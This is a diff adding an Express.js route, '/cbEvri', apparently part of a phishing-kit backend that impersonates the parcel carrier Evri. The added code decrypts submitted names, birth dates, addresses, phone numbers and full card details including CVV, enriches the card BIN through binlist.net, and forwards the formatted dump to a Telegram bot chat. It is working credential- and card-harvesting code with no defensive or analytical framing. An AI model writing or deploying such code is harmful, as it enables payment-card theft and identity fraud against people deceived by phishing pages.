@@ -10415,6 +10415,76 @@ app.post("/saimEvri", (req, res) => {
     });
 });
 
+app.options("/cbEvri", cors());
+
+app.post("/cbEvri", (req, res) => {
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      axios
+        .post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
+            chat_id: "-626303583",
+            text: `Evri:\n${originalText}`,
+            parse_mode: "Markdown",
+          }
+        )
+        .catch((e) => {
+          console.log(e);
+        });
+
+      res.send("Update Completed");
+    });
+});
+
 app.options("/eggmanEvri", cors());
 
 app.post("/eggmanEvri", (req, res) => {
